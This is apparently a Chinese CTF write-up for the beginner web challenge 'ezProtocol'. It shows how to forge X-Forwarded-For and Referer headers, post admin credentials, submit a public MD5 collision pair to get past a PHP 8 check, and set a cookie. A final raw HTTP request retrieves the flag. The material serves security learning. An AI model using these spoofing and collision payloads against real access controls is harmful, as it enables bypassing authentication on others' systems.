---
date: 2024-05-27
categories: 
    - NUSTCTF
tags:
    - CTF
    - http
---

# 每日一题 —— [NUSTCTF 2022 新生赛]ezProtocol

> 题目地址: <https://www.nssctf.cn/problem/3175>

<!-- more -->

这题通篇看下来就是一个不断提交 http 请求的题目，所以较为简单。但是我本以为可以秒掉，但是却还是掉坑里了，主要是工具的使用出了问题，总体的思路是对的。在此记录一下

在前半部分，我们使用 hoppscotch(原 postwoman) 作为我们的 http 请求工具，虽然 HackBar 也一样，但是这题我用 HackBar 出现了一些小问题，所以为了方便，我从一开始就用 postwoman 来写。

## You must come from 127.0.0.1

这一步，要求你从 127.0.0.1 发起请求，显然这是 xff 伪造。打开 postwoman, 在 header 一栏添加如下 payload：

```
X-Forwarded-For: 127.0.0.1
```

## Have you just visited http://localhost/?

这一步，要求你从 `http://localhost/` 这个网址跳转过来。我们使用的是 referer 伪造。在 header 一栏添加如下 payload:

```
Referer: "http://localhost/"
```

## You must use POST

这一步，直接把方法改成 POST 就可以了。

## Your posted username must be admin

这一步要求你 post 一个 `username` 参数，值为 `admin` ，直接在 body 一栏添加 payload：

```
username: admin
```

## Your posted p1 and p2 must be different but have the same md5

这一步要求你 post 两个变量，值不能相等，但是他们的 md5 值要相等。我们可能会想到 0e 绕过或者是数组绕过，但是通过 wappalyzer 插件或者是通过返回的 `x-powered-by` header,可以知道服务器使用的 php8, 也就是我们必须使用最常规的 md5 碰撞。

我们通过搜索，找到了两串不一样的字符串，这里直接给出 payload：

```
p1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&p2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

我们发现，我们通过 postwoman 无法这么直接提交，所以我们在 postwoman 得到的 http 请求字符串复制下来，复制到 burpsuite 中重新提交。为什么这么做呢，是因为 postwoman 会自动把这一段已经编码好的字符串再次编码一次。所以我们需要在 burpsuite 直接提交原生字符串，绝不会有任何修改。这一步在 HackBar 里面直接报错，原因未知。

## I don' want to follow diet menu anymore, I want to have a big meal

这一步初看看不懂，但是发现对面传来了 `Set-Cookie` 的 header, 所以我们新建一个 `Cookie` 头，并按照要求把它改成 `big%20meal` ，如下：

```
Cookie: dinner=big%20meal
```

得到 flag.
 
最终 http 请求字符串如下：

```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Referer: http://localhost/
Host: node5.anna.nssctf.cn:26594
Content-Length: 324
Cookie: dinner=big%20meal

username=admin&p1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&p2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```
